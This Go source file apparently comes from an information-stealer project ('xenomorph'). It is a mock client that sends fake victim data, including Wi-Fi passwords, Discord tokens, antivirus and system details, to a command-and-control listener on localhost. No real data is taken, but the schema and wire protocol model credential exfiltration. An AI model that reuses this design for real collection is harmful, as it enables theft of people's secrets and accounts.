package main

import (
	"encoding/binary"
	"encoding/json"
	"net"

	"github.com/codevault-llc/xenomorph/internal/common"
)

type ConnectionData struct {
	ComputerName    string `json:"computer_name"`
	ComputerOS      string `json:"computer_os"`
	ComputerVersion string `json:"computer_version"`
	TotalMemory     string `json:"total_memory"`
	UpTime          string `json:"up_time"`
	UUID            string `json:"uuid"`
	CPU             string `json:"cpu"`
	GPU             string `json:"gpu"`
	UAC             string `json:"uac"`
	AntiVirus       string `json:"anti_virus"`

	IP       string `json:"ip"`
	ClientIP string `json:"client_ip"`
	Country  string `json:"country"`
	Timezone string `json:"timezone"`

	Disks string `json:"disks"`

	Wifi string `json:"wifi"`

	WebBrowsers   string `json:"web_browsers"`
	DiscordTokens string `json:"discord_tokens"`
}

func main() {
	conn, err := net.Dial("tcp", "localhost:8080")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	testJson := ConnectionData{
		ComputerName:    "TestComputer",
		ComputerOS:      "Windows",
		ComputerVersion: "10",
		TotalMemory:     "16GB",
		UpTime:          "1d",
		UUID:            "1234",
		CPU:             "Intel i7",
		GPU:             "Nvidia RTX 3080",
		UAC:             "Enabled",
		AntiVirus:       "Windows Defender",
		IP:              "192.168.99.1",
		ClientIP:        "1208.123.123.123",
		Country:         "US",
		Timezone:        "PST",
		Disks:           "C: 100GB, D: 200GB",
		Wifi:            "SSID: TestWifi, Password: TestPassword",
		WebBrowsers:     "Chrome, Firefox",
		DiscordTokens:   "token1, token2",
	}

	jsonData, err := json.Marshal(testJson)
	if err != nil {
		panic(err)
	}

	headerData := &common.Header{
		Type:      "JSON",
		TotalSize: len(jsonData),
	}

	headerJson, err := json.Marshal(headerData)
	if err != nil {
		panic(err)
	}

	rawJsonData := json.RawMessage(jsonData)
	message := &common.Message{
		Type:     common.MessageTypeConnection,
		JsonData: &rawJsonData,
	}

	headerSize := uint32(len(headerJson))
	headerSizeBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(headerSizeBuf, headerSize)
	if _, err := conn.Write(headerSizeBuf); err != nil {
		panic(err)
	}

	conn.Write(headerJson)

	messageJson, err := json.Marshal(message)
	if err != nil {
		panic(err)
	}

	conn.Write(messageJson)
	conn.Write([]byte("END_OF_MESSAGE"))
}
